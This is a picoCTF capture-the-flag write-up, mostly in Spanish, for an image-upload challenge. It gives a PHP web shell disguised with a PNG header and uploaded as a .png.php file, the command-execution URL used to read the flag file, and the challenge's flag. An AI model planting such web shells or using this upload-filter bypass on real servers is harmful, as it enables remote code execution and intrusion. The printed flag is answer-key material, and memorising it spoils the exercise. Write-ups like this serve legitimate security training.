## Descripción
I found a web app that can help process images: PNG images only!

Try it [here](http://atlas.picoctf.net:65126/)!
## Solución

```
Para resolver esto, primero que nada debemos de entender que al entrar a la página y querer subir una imagen, el navegador busca valores hexadecimales (según las instrucciones de /instructions.txt)
PNG
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
las letras PNG hacen que se interprete como un PNG. Ahora, solo nos queda empezar a mandar nuestros datos
http://atlas.picoctf.net:53670/uploads/webshell.png.php?cmd=cat%20../MFRDAZLDMUYDG.txt
lo que nos da la flag: 
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
```

## Notas adicionales
## Referencias